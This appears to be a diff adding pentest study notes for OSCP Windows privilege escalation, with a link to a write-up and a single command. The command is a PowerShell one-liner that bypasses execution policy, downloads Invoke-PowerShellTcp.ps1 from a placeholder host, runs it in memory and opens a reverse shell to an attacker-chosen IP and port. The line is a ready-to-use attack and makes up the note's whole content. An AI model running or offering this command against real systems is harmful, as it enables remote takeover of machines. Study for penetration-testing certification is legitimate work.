@@ -1,0 +1,5 @@
+https://butter0verflow.github.io/oscp/OSCP-WindowsPrivEsc-Part1/
+--------------------------------------------
+Reverse shell using Invoke-PowerShellTcp.ps1
+
+1. powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"
